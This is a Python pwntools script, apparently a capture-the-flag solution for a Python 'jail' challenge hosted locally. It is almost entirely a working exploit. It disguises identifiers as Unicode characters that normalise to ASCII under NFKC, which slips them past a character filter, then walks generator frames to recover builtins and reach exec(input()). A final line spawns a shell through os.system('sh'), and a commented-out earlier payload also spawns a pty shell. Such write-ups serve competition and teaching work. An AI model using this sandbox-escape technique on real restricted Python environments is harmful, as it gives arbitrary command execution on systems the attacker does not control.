from pwn import *
from unicodedata import normalize
import string

IDENT = string.ascii_letters + string.digits + "_"
NOT_IDENT = "".join(c for c in string.printable if c not in IDENT)

p = remote('localhost', 5000)

# uhhhh this doesnt work since pty is bad on redpwn jail
# p.sendline('[q:=[*(z:=(\u1dbb.g\u2139_\U0001d453\u02b3ame.\u1da0\ufe33b\xaack.\uff46\ufe34\u1d47\u1d43\u1d9c\u1d4f.\U0001d41f\ufe4d\uff42u\u1d62l\u1d57\u2071\u207f\u02e2 for[]in[[]]))][0],\uff51[[*\U000107a5][6]]("pty").\u017f\u1d56\u2090w\u2099("sh")]'.encode())

# there does exist another payload
t = '([]==[])'
C=lambda v: '+'.join(ord(v)*[t])
pl = f'[*(g:=((g:=g.gi_frame.f_back.f_back.f_builtins)[(Y:="%c")*4%({C("e")},{C("x")},{C("e")},{C("c")})](g[Y*5%({C("i")},{C("n")},{C("p")},{C("u")},{C("t")})]())'
after = 'for _ in[1]))]'


lists = {}
for c in range(0x110000):
    n = normalize('NFKC', chr(c))
    try:
        exec('ZZZ=' + chr(c))
    except NameError as e:
        pass
    except Exception as e:
        if n != '_':
            continue
    if n in IDENT:
        if n not in lists:
            lists[n] = []
        lists[n].append(chr(c))


lists['c'][0],lists['c'][2] = lists['c'][2],lists['c'][0]

new = ''
for l in after:
    if l in IDENT:
        if len(lists[l]) == 0:
            print(l, lists[l])
        lists[l].pop(0)
for l in pl:
    if l in IDENT:
        if len(lists[l]) == 0:
            print(l, lists[l])
        new += lists[l].pop(0)
    else:
        new += l


new = new + after
p.sendline(new.encode())
# lol still no builtins so you have to run this afterwards
p.sendline('[*(g:=((g:=g.gi_frame.f_back.f_back.f_back.f_back.f_builtins)["__import__"]("os").system("sh")for _ in[1]))]')
p.interactive()

